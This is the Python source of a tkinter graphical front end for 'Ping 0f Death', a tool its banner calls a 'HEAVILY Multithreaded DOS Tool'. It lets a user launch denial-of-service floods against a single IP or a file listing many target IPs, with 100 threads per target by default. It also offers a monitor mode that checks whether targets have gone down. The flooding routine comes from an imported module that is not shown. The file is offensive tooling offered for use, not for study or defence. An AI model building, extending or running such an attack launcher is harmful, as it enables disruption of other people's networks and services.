#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ======================
# Ping 0f Death GUI (PoD_GUI.py)
# http://github.com/34zY
# Author : 34zY
# ======================
# GUI Interface for PoD
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import threading
import sys
import os
import re
from datetime import datetime

# Set UTF-8 encoding for console output (for debugging)
if sys.version_info >= (3, 7) and hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# Import functions from PoD.py
try:
    from PoD import _3vil_buffer, validate_ip, validate_thread_count, validate_file_path, style, active_threads
    import PoD
except ImportError as e:
    print(f"Error importing PoD module: {e}")
    print("Make sure PoD.py is in the same directory as PoD_GUI.py")
    sys.exit(1)

class StdoutRedirector:
    """Redirect stdout to GUI log widget"""
    def __init__(self, text_widget, gui_instance):
        self.text_widget = text_widget
        self.gui = gui_instance
        # Regex to remove ANSI escape codes
        self.ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        
    def write(self, message):
        if message.strip():  # Only write non-empty messages
            # Remove ANSI color codes for GUI display
            clean_message = self.ansi_escape.sub('', message)
            
            # Determine color based on message content
            tag = "info"
            if "[!]" in clean_message or "error" in clean_message.lower():
                tag = "error"
            elif "[+]" in clean_message or "success" in clean_message.lower():
                tag = "success"
            elif "[?]" in clean_message or "warning" in clean_message.lower():
                tag = "warning"
            elif "[v]" in clean_message:
                tag = "verbose"
            elif "[M]" in clean_message:
                tag = "info"
            elif "[✓]" in clean_message or "[✗]" in clean_message:
                tag = "info"  # Monitor messages
            elif "Thread-" in clean_message and "@" in clean_message:
                tag = "verbose"  # Subprocess output
            
            # Add timestamp
            timestamp = datetime.now().strftime("%H:%M:%S")
            formatted_msg = f"[{timestamp}] {clean_message}\n"
            
            self.text_widget.insert(tk.END, formatted_msg, tag)
            self.text_widget.see(tk.END)
            self.text_widget.update()
    
    def flush(self):
        pass  # Required for file-like object

class PoDGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ping 0f Death - GUI Interface")
        self.root.geometry("1200x700")
        self.root.minsize(900, 600)  # Minimum window size
        self.root.resizable(True, True)
        
        # Color scheme matching the banner (Red/Black theme)
        self.bg_dark = "#0a0a0a"
        self.bg_secondary = "#1a1a1a"
        self.fg_red = "#ff0000"
        self.fg_light_red = "#ff6666"
        self.fg_white = "#ffffff"
        self.fg_gray = "#808080"
        self.fg_green = "#00ff00"
        self.fg_yellow = "#ffff00"
        
        self.root.configure(bg=self.bg_dark)
        
        # State variables
        self.is_running = False
        self.attack_thread = None
        self.original_stdout = sys.stdout
        
        # Configure grid weights for resizing
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=0)  # Left column (controls) - fixed width
        self.root.grid_columnconfigure(1, weight=1)  # Right column (log) - expandable
        
        # Setup GUI components
        self.create_left_panel()
        self.create_right_panel()
        self.create_status_bar()
        
        # Redirect verbose output to GUI
        self.setup_output_redirect()
        
    def create_left_panel(self):
        """Create left panel with controls"""
        # Main left container
        left_container = tk.Frame(self.root, bg=self.bg_dark)
        left_container.grid(row=0, column=0, sticky="nsew", padx=(10, 5), pady=10)
        
        # Banner with full ASCII bomb logo
        banner_text = """            ;....;                           
           ;....; .;                /\\          
         ;.....'   .;              / /         
        ;.....;     ;.           /VVV\\            
       ,.....'       ;          /VVVVV\\         
       ......;       ;         /VVVVVVV\\       
       ;.....;       ;         VVVVVVVVV\\       
      ,;......;     ;'         / VVVVVVVVV      
    ;.........`. ,,,;.        / /  DVVVVVVV   
  .';.................;,     / /     DVVVVVV   
 ,......;......;;;;....;,   / /        DVVVVV  
;`......`'......;;;..... ,#/ /          DVVVVV
.`.......`;......;;... ;..# /            DVVVVV
..`.......`;........ ;....#/              DVVVV
`.`.......`;...... ;......#                DVVV
 ...`.......`;; ;.........##                VVV
 ....`.......`;........;...#                VVV
 `.....`............;'`.;..#                VV
  `.....`........;' /  / `.#                V  
   ......`.....;'  /  /   `#              

██▓███   ▒█████  ▓█████▄
▓██░  ██▒▒██▒  ██▒▒██▀ ██▌  | Ping 0f Death 
▓██░ ██▓▒▒██░  ██▒░██   █▌  | HEAVILY Multithreaded DOS Tool
▒██▄█▓▒ ▒▒██   ██░░▓█▄   ▌  | Github : http://github.com/34zY
▒██▒ ░  ░░ ████▓▒░░▒████▓   | GUI Interface"""
        
        banner_label = tk.Label(
            left_container,
            text=banner_text,
            font=("Courier New", 9, "bold"),
            fg=self.fg_red,
            bg=self.bg_dark,
            justify=tk.LEFT
        )
        banner_label.pack(pady=(0, 10))
        
        # Separator
        separator = tk.Frame(left_container, height=2, bg=self.fg_red)
        separator.pack(fill=tk.X, pady=5)
        
        # Mode selection
        self.create_mode_frame(left_container)
        
        # Configuration
        self.create_options_frame(left_container)
        
        # Control buttons
        self.create_control_frame(left_container)
    
    def create_right_panel(self):
        """Create right panel with activity log"""
        # Activity log frame
        self.create_log_frame()
        
    def create_mode_frame(self, parent):
        """Create mode selection frame (Single IP or File)"""
        mode_frame = tk.LabelFrame(
            parent,
            text="Attack Mode",
            font=("Arial", 9, "bold"),
            fg=self.fg_red,
            bg=self.bg_dark,
            borderwidth=2,
            relief=tk.GROOVE
        )
        mode_frame.pack(fill=tk.X, pady=5)
        
        self.mode_var = tk.StringVar(value="single")
        
        # Single IP mode
        single_radio = tk.Radiobutton(
            mode_frame,
            text="Single Target IP",
            variable=self.mode_var,
            value="single",
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            selectcolor=self.bg_secondary,
            activebackground=self.bg_dark,
            activeforeground=self.fg_light_red,
            command=self.toggle_mode
        )
        single_radio.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
        
        # File mode
        file_radio = tk.Radiobutton(
            mode_frame,
            text="Multiple Targets (File)",
            variable=self.mode_var,
            value="file",
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            selectcolor=self.bg_secondary,
            activebackground=self.bg_dark,
            activeforeground=self.fg_light_red,
            command=self.toggle_mode
        )
        file_radio.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)
        
    def create_options_frame(self, parent):
        """Create options frame for IP/File and threads"""
        options_frame = tk.LabelFrame(
            parent,
            text="Configuration",
            font=("Arial", 9, "bold"),
            fg=self.fg_red,
            bg=self.bg_dark,
            borderwidth=2,
            relief=tk.GROOVE
        )
        options_frame.pack(fill=tk.X, pady=5)
        
        # Target IP/File section
        target_inner_frame = tk.Frame(options_frame, bg=self.bg_dark)
        target_inner_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.target_label = tk.Label(
            target_inner_frame,
            text="Target IP:",
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            width=12,
            anchor=tk.W
        )
        self.target_label.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        
        self.target_entry = tk.Entry(
            target_inner_frame,
            font=("Arial", 9),
            bg=self.bg_secondary,
            fg=self.fg_white,
            insertbackground=self.fg_red,
            width=30
        )
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        target_inner_frame.grid_columnconfigure(1, weight=1)
        
        self.browse_btn = tk.Button(
            target_inner_frame,
            text="Browse",
            font=("Arial", 9),
            bg=self.bg_secondary,
            fg=self.fg_white,
            activebackground=self.fg_red,
            activeforeground=self.fg_white,
            command=self.browse_file,
            state=tk.DISABLED
        )
        self.browse_btn.grid(row=0, column=2, padx=5, pady=5)
        
        # Thread count section
        thread_inner_frame = tk.Frame(options_frame, bg=self.bg_dark)
        thread_inner_frame.pack(fill=tk.X, padx=10, pady=5)
        
        thread_label = tk.Label(
            thread_inner_frame,
            text="Threads/target:",
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            width=12,
            anchor=tk.W
        )
        thread_label.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        
        self.thread_entry = tk.Entry(
            thread_inner_frame,
            font=("Arial", 9),
            bg=self.bg_secondary,
            fg=self.fg_white,
            insertbackground=self.fg_red,
            width=15
        )
        self.thread_entry.insert(0, "100")
        self.thread_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        
        thread_info = tk.Label(
            thread_inner_frame,
            text="(Recommended: 50-250)",
            font=("Arial", 8),
            fg=self.fg_gray,
            bg=self.bg_dark
        )
        thread_info.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        
        # Verbose mode
        verbose_inner_frame = tk.Frame(options_frame, bg=self.bg_dark)
        verbose_inner_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.verbose_var = tk.BooleanVar(value=False)
        verbose_check = tk.Checkbutton(
            verbose_inner_frame,
            text="Verbose Mode (Show Packets Sent Count)",
            variable=self.verbose_var,
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            selectcolor=self.bg_secondary,
            activebackground=self.bg_dark,
            activeforeground=self.fg_light_red
        )
        verbose_check.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        
        # Monitor mode
        self.monitor_var = tk.BooleanVar(value=False)
        monitor_check = tk.Checkbutton(
            verbose_inner_frame,
            text="Monitor Mode (Check Target Response Every 10s)",
            variable=self.monitor_var,
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_dark,
            selectcolor=self.bg_secondary,
            activebackground=self.bg_dark,
            activeforeground=self.fg_light_red
        )
        monitor_check.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        
    def create_control_frame(self, parent):
        """Create control buttons"""
        control_frame = tk.Frame(parent, bg=self.bg_dark)
        control_frame.pack(fill=tk.X, pady=10)
        
        # Start button
        self.start_btn = tk.Button(
            control_frame,
            text="⚡ START",
            font=("Arial", 10, "bold"),
            bg=self.fg_red,
            fg=self.fg_white,
            activebackground=self.fg_light_red,
            activeforeground=self.fg_white,
            height=2,
            command=self.start_attack,
            cursor="hand2"
        )
        self.start_btn.pack(fill=tk.X, pady=2)
        
        # Stop button
        self.stop_btn = tk.Button(
            control_frame,
            text="⛔ STOP",
            font=("Arial", 10, "bold"),
            bg=self.bg_secondary,
            fg=self.fg_gray,
            activebackground=self.fg_yellow,
            activeforeground=self.bg_dark,
            height=2,
            command=self.stop_attack,
            state=tk.DISABLED,
            cursor="hand2"
        )
        self.stop_btn.pack(fill=tk.X, pady=2)
        
        # Clear log button
        clear_btn = tk.Button(
            control_frame,
            text="Clear Log",
            font=("Arial", 9),
            bg=self.bg_secondary,
            fg=self.fg_white,
            activebackground=self.fg_gray,
            activeforeground=self.fg_white,
            command=self.clear_log,
            cursor="hand2"
        )
        clear_btn.pack(fill=tk.X, pady=2)
        
    def create_log_frame(self):
        """Create log output frame on the right side"""
        log_frame = tk.LabelFrame(
            self.root,
            text="Activity Log",
            font=("Arial", 10, "bold"),
            fg=self.fg_red,
            bg=self.bg_dark,
            borderwidth=2,
            relief=tk.GROOVE
        )
        log_frame.grid(row=0, column=1, sticky="nsew", padx=(5, 10), pady=10)
        
        # Create scrolled text widget
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            font=("Courier New", 9),
            bg=self.bg_secondary,
            fg=self.fg_green,
            insertbackground=self.fg_red,
            wrap=tk.WORD
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure text tags for colored output
        self.log_text.tag_config("error", foreground=self.fg_red)
        self.log_text.tag_config("success", foreground=self.fg_green)
        self.log_text.tag_config("warning", foreground=self.fg_yellow)
        self.log_text.tag_config("info", foreground=self.fg_white)
        self.log_text.tag_config("verbose", foreground="#00ffff")
        
        self.log("[INFO] PoD GUI initialized. Ready to start.", "info")
        
    def create_status_bar(self):
        """Create status bar at bottom"""
        status_frame = tk.Frame(self.root, bg=self.bg_secondary, height=25)
        status_frame.grid(row=1, column=0, columnspan=2, sticky="ew")
        status_frame.grid_propagate(False)
        
        self.status_label = tk.Label(
            status_frame,
            text="Status: Idle",
            font=("Arial", 9),
            fg=self.fg_white,
            bg=self.bg_secondary,
            anchor=tk.W
        )
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        # Creator credit in the center
        creator_label = tk.Label(
            status_frame,
            text="@34zY",
            font=("Courier New", 9, "bold"),
            fg=self.fg_red,
            bg=self.bg_secondary
        )
        creator_label.pack(side=tk.LEFT, expand=True)
        
        self.thread_count_label = tk.Label(
            status_frame,
            text="Active Threads: 0",
            font=("Arial", 9),
            fg=self.fg_green,
            bg=self.bg_secondary,
            anchor=tk.E
        )
        self.thread_count_label.pack(side=tk.RIGHT, padx=10)
        
    def toggle_mode(self):
        """Toggle between single IP and file mode"""
        mode = self.mode_var.get()
        if mode == "single":
            self.target_label.config(text="Target IP:")
            self.browse_btn.config(state=tk.DISABLED)
            self.target_entry.delete(0, tk.END)
        else:
            self.target_label.config(text="Target File:")
            self.browse_btn.config(state=tk.NORMAL)
            self.target_entry.delete(0, tk.END)
            
    def browse_file(self):
        """Browse for target file"""
        filename = filedialog.askopenfilename(
            title="Select Target File",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if filename:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, filename)
            
    def log(self, message, tag="info"):
        """Add message to log with timestamp and color"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_msg = f"[{timestamp}] {message}\n"
        
        self.log_text.insert(tk.END, formatted_msg, tag)
        self.log_text.see(tk.END)
        self.log_text.update()
        
    def clear_log(self):
        """Clear the log"""
        self.log_text.delete(1.0, tk.END)
        self.log("[INFO] Log cleared.", "info")
        
    def update_status(self, status, color=None):
        """Update status bar"""
        self.status_label.config(text=f"Status: {status}")
        if color:
            self.status_label.config(fg=color)
            
    def update_thread_count(self):
        """Update thread count display"""
        count = threading.active_count() - 1  # Subtract main thread
        self.thread_count_label.config(text=f"Active Threads: {count}")
        if self.is_running:
            self.root.after(1000, self.update_thread_count)
            
    def setup_output_redirect(self):
        """Setup output redirection to GUI"""
        # Redirect stdout to GUI log widget
        sys.stdout = StdoutRedirector(self.log_text, self)
        
    def validate_inputs(self):
        """Validate user inputs before starting attack - SECURE"""
        mode = self.mode_var.get()
        target = self.target_entry.get().strip()
        threads = self.thread_entry.get().strip()
        
        # Validate thread count using secure validation
        thread_count = validate_thread_count(threads)
        if thread_count is None:
            messagebox.showerror(
                "Invalid Input", 
                f"Thread count must be a valid number between 1 and {PoD.MAX_THREADS}"
            )
            return False
        
        # Additional warning for high thread counts
        if thread_count > 1000:
            response = messagebox.askyesno(
                "High Thread Count",
                f"Using {thread_count} threads may cause system instability.\nContinue?"
            )
            if not response:
                return False
            
        # Validate target
        if not target:
            messagebox.showerror("Invalid Input", "Please enter a target IP or select a file")
            return False
            
        if mode == "single":
            # Use secure IP validation
            if not validate_ip(target):
                messagebox.showerror("Invalid Input", f"Invalid IP address: {target}")
                return False
        else:
            # Use secure file path validation
            valid_path = validate_file_path(target)
            if not valid_path:
                messagebox.showerror(
                    "File Error", 
                    f"Invalid or inaccessible file: {target}\nFile must exist, be readable, and not in sensitive directories."
                )
                return False
                
        return True
        
    def start_attack(self):
        """Start the attack in a separate thread"""
        if not self.validate_inputs():
            return
            
        self.is_running = True
        PoD.running = True
        PoD.verbose = self.verbose_var.get()
        PoD.monitor = self.monitor_var.get()
        
        # Update UI
        self.start_btn.config(state=tk.DISABLED, bg=self.bg_secondary, fg=self.fg_gray)
        self.stop_btn.config(state=tk.NORMAL, bg=self.fg_yellow, fg=self.bg_dark)
        self.update_status("Running", self.fg_green)
        
        # Start attack in separate thread
        self.attack_thread = threading.Thread(target=self.run_attack, daemon=True)
        self.attack_thread.start()
        
        # Start thread count update
        self.update_thread_count()
        
    def run_attack(self):
        """Execute the attack (runs in separate thread)"""
        mode = self.mode_var.get()
        target = self.target_entry.get().strip()
        threads = self.thread_entry.get().strip()
        
        try:
            if mode == "single":
                self.log(f"[ATTACK] Starting attack on {target} with {threads} threads", "warning")
                result = _3vil_buffer(target, threads)
                if result:
                    self.log(f"[SUCCESS] Attack started on {target}", "success")
                    
                    # Start monitor thread if monitor mode is enabled
                    if PoD.monitor:
                        from PoD import monitor_target, monitor_threads
                        monitor_thread = threading.Thread(target=monitor_target, args=(target,), daemon=True, name=f"Monitor-{target}")
                        monitor_thread.start()
                        monitor_threads.append(monitor_thread)
                        self.log(f"[MONITOR] Monitoring enabled for {target}", "info")
                else:
                    self.log(f"[ERROR] Failed to start attack on {target}", "error")
            else:
                self.log(f"[ATTACK] Reading targets from file: {target}", "info")
                with open(target, 'r') as f:
                    ip_list = []
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            ip_list.append(line)
                            
                self.log(f"[INFO] Found {len(ip_list)} target(s) in file", "info")
                
                success_count = 0
                for ip in ip_list:
                    if not PoD.running:
                        break
                    self.log(f"[ATTACK] Targeting {ip} with {threads} threads", "warning")
                    result = _3vil_buffer(ip, threads)
                    if result:
                        success_count += 1
                        self.log(f"[SUCCESS] Attack started on {ip}", "success")
                        
                        # Start monitor thread if monitor mode is enabled
                        if PoD.monitor:
                            from PoD import monitor_target, monitor_threads
                            monitor_thread = threading.Thread(target=monitor_target, args=(ip,), daemon=True, name=f"Monitor-{ip}")
                            monitor_thread.start()
                            monitor_threads.append(monitor_thread)
                            self.log(f"[MONITOR] Monitoring enabled for {ip}", "info")
                    else:
                        self.log(f"[ERROR] Failed to start attack on {ip}", "error")
                        
                self.log(f"[INFO] Attack started on {success_count}/{len(ip_list)} targets", "info")
                
        except Exception as e:
            self.log(f"[ERROR] Exception occurred: {str(e)}", "error")
            self.stop_attack()
            
    def stop_attack(self):
        """Stop the ongoing attack"""
        self.is_running = False
        PoD.running = False
        
        # Update UI
        self.start_btn.config(state=tk.NORMAL, bg=self.fg_red, fg=self.fg_white)
        self.stop_btn.config(state=tk.DISABLED, bg=self.bg_secondary, fg=self.fg_gray)
        self.update_status("Stopped", self.fg_yellow)
        
        self.log("[INFO] Attack stopped by user", "warning")
        
    def on_closing(self):
        """Handle window closing"""
        if self.is_running:
            response = messagebox.askyesno(
                "Confirm Exit",
                "Attack is still running. Are you sure you want to exit?"
            )
            if not response:
                return
            self.stop_attack()
        
        # Restore original stdout
        sys.stdout = self.original_stdout
        self.root.destroy()

def main():
    """Main entry point"""
    root = tk.Tk()
    app = PoDGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    
    # Center window on screen
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()

if __name__ == "__main__":
    main()
